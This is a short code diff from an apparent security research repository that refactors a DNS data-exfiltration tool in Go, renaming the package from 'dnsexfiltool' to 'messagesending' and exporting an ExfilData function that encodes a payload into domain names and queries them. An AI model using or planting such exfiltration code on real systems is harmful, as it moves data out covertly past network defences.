@@ -1,11 +1,11 @@
-package dnsexfiltool
+package messagesending
 
 import (
-	"github.com/sam-bee/security-itsalwaysdns/pkg/codec"
+	"github.com/sam-bee/security-itsalwaysdns/shared/codec"
 	"log"
 )
 
-func exfilData(exfilPayload string, mainDomain string, dns DnsLookup) {
+func ExfilData(exfilPayload string, mainDomain string, dns DnsLookup) {
 	domains := domainsToQuery(exfilPayload, mainDomain)
 	performDnsLookups(domains, dns)
 }
